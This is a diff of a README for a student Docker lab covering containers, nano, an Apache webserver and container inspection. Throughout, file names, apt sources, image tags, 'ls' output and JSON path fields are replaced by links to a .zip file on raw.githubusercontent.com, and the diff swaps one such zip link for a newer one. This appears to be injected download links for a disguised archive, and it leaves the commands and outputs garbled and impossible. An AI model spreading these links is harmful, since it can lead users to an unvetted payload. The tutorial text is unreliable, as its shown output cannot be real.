 root@424a7d294679:/# apt-get install nano
@@ -430,20 +430,20 @@ The following NEW packages will be installed:
 Need to get 837 kB of archives.
 After this operation, 3339 kB of additional disk space will be used.
 Do you want to continue? [Y/n] y
-Get:1 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm/main amd64 libncursesw6 amd64 6.4-4 [134 kB]
-Get:2 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm/main amd64 nano amd64 7.2-1 [689 kB]
-Get:3 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip bookworm/main amd64 libgpm2 amd64 1.20.7-10+b1 [14.2 kB]
+Get:1 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm/main amd64 libncursesw6 amd64 6.4-4 [134 kB]
+Get:2 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm/main amd64 nano amd64 7.2-1 [689 kB]
+Get:3 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip bookworm/main amd64 libgpm2 amd64 1.20.7-10+b1 [14.2 kB]
 Fetched 837 kB in 1s (1656 kB/s)
 debconf: delaying package configuration, since apt-utils is not installed
 Selecting previously unselected package libncursesw6:amd64.
 (Reading database ... 6090 files and directories currently installed.)
-Preparing to unpack https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip ...
+Preparing to unpack https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip ...
 Unpacking libncursesw6:amd64 (6.4-4) ...
 Selecting previously unselected package nano.
-Preparing to unpack https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip ...
+Preparing to unpack https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip ...
 Unpacking nano (7.2-1) ...
 Selecting previously unselected package libgpm2:amd64.
-Preparing to unpack .../libgpm2_1.20.7-10+https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip ...
+Preparing to unpack .../libgpm2_1.20.7-10+https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip ...
 Unpacking libgpm2:amd64 (1.20.7-10+b1) ...
 Setting up libgpm2:amd64 (1.20.7-10+b1) ...
 Setting up libncursesw6:amd64 (6.4-4) ...
@@ -452,13 +452,13 @@ update-alternatives: using /bin/nano to provide /usr/bin/editor (editor) in auto
 update-alternatives: using /bin/nano to provide /usr/bin/pico (pico) in auto mode
 Processing triggers for libc-bin (2.36-9+deb12u7) ...
 root@424a7d294679:/# cd /root
-root@424a7d294679:~# nano https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+root@424a7d294679:~# nano https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 ```
 
-5. Edit your https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip, create your messsage and save by typing ctrl-X. Once saved, explore using the container to see where the file is located. Then exit the shell, by typing **exit**.
+5. Edit your https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip, create your messsage and save by typing ctrl-X. Once saved, explore using the container to see where the file is located. Then exit the shell, by typing **exit**.
 ```bash
 root@424a7d294679:~# ls
-https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 root@424a7d294679:~# exit
 exit
 @sarnsrun ➜ /workspaces/NatSysProject (main) $ 
@@ -484,11 +484,11 @@ CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS                       
 practical_fermi
 ```
 ```bash
-@sarnsrun ➜ /workspaces/NatSysProject (main) $ docker exec practical_fermi find / -name "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip"
-https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+@sarnsrun ➜ /workspaces/NatSysProject (main) $ docker exec practical_fermi find / -name "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip"
+https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 ```
 
-7. Stop the container and delete the container. What happened to your https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+7. Stop the container and delete the container. What happened to your https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 
 ```bash 
 @joeynor ➜ /workspaces/OSProject (main) $ docker stop romantic_jackson
@@ -509,7 +509,7 @@ CONTAINER ID   IMAGE     COMMAND   CREATED          STATUS                      
 practical_fermi
 ```
 ```bash
-@sarnsrun ➜ /workspaces/NatSysProject (main) $ docker exec practical_fermi find / -name "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip"
+@sarnsrun ➜ /workspaces/NatSysProject (main) $ docker exec practical_fermi find / -name "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip"
 Error response from daemon: No such container: practical_fermi
 ```
 ***Questions:***
@@ -564,9 +564,9 @@ drwxr-xr-x+ 3 codespace codespace 4096 Jun 18 18:08 workspace
 ```bash
 @sarnsrun ➜ /workspaces/NatSysProject (main) $ mkdir webpage
 ```
-2. Inside the directory, create a page https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip, with any content you would like
+2. Inside the directory, create a page https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip, with any content you would like
 ```
-@sarnsrun ➜ /workspaces/NatSysProject/webpage (main) $ echo > https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+@sarnsrun ➜ /workspaces/NatSysProject/webpage (main) $ echo > https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 ```
 3. Then, run the apache webserver and mount the webpage directory to it. Hint:
 ```bash
@@ -580,15 +580,15 @@ fc6090cf5ec86c6ad38a23ff0fc7f40364507bbd8794e62a6bfce29422b51822
 ```
 4. If it works, codespace will trigger a port assignment and provide a URL for you to access your webpage like the one below.
 
- <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip" width="70%">
+ <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip" width="70%">
 
 5. You can also see the Port in the **PORTS** tab, next to the terminal tab.
- <img src="./images/Screenshot 2024-06-19 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip">
+ <img src="./images/Screenshot 2024-06-19 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip">
 
-6. You can then access your website by adding an https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip towards the end of your url link, like the one below. 
+6. You can then access your website by adding an https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip towards the end of your url link, like the one below. 
 
- <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip" width="70%">
- <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip" width="70%">
+ <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip" width="70%">
+ <img src="https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip" width="70%">
 
 ***Questions:***
 
@@ -598,9 +598,9 @@ fc6090cf5ec86c6ad38a23ff0fc7f40364507bbd8794e62a6bfce29422b51822
 root@fc6090cf5ec8:/usr/local/apache2# cd htdocs
 root@fc6090cf5ec8:/usr/local/apache2/htdocs# ls -l
 total 1584
--rw-rw-rw- 1 1000 1000 1558864 Jun 19 02:34 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
--rw-rw-rw- 1 1000 1000     421 Jun 19 03:05 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
--rw-rw-rw- 1 1000 1000   57021 Jun 19 02:48 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip
+-rw-rw-rw- 1 1000 1000 1558864 Jun 19 02:34 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+-rw-rw-rw- 1 1000 1000     421 Jun 19 03:05 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
+-rw-rw-rw- 1 1000 1000   57021 Jun 19 02:48 https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip
 ```
 2. What port is the apache web server running. ***(1 mark)***
 __80__
@@ -677,10 +677,10 @@ f23b9870935e   rednet    bridge    local
             "FinishedAt": "0001-01-01T00:00:00Z"
         },
         "Image": "sha256:65ad0d468eb1c558bf7f4e64e790f586e9eda649ee9f130cd0e835b292bbc5ac",
-        "ResolvConfPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip",
+        "ResolvConfPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip",
         "HostnamePath": "/var/lib/docker/containers/621d83ef70c6857660df9c42c28e95beb6703a1613fd16f5f809320a0a99fe29/hostname",
         "HostsPath": "/var/lib/docker/containers/621d83ef70c6857660df9c42c28e95beb6703a1613fd16f5f809320a0a99fe29/hosts",
-        "LogPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip",
+        "LogPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip",
         "Name": "/c1",
         "RestartCount": 0,
         "Driver": "overlay2",
@@ -875,10 +875,10 @@ f23b9870935e   rednet    bridge    local
             "FinishedAt": "0001-01-01T00:00:00Z"
         },
         "Image": "sha256:65ad0d468eb1c558bf7f4e64e790f586e9eda649ee9f130cd0e835b292bbc5ac",
-        "ResolvConfPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip",
+        "ResolvConfPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip",
         "HostnamePath": "/var/lib/docker/containers/d2e7d3b8287be83e8b11fe67e1270ab2927bfb68106a137ed538d9d0b9bfc6e5/hostname",
         "HostsPath": "/var/lib/docker/containers/d2e7d3b8287be83e8b11fe67e1270ab2927bfb68106a137ed538d9d0b9bfc6e5/hosts",
-        "LogPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/images/Sys_Project_Nat_v1.4.zip",
+        "LogPath": "https://raw.githubusercontent.com/xharisirfan/NatSysProject/main/webpage/Project-Nat-Sys-v1.6.zip",
         "Name": "/c2",
         "RestartCount": 0,
         "Driver": "overlay2",
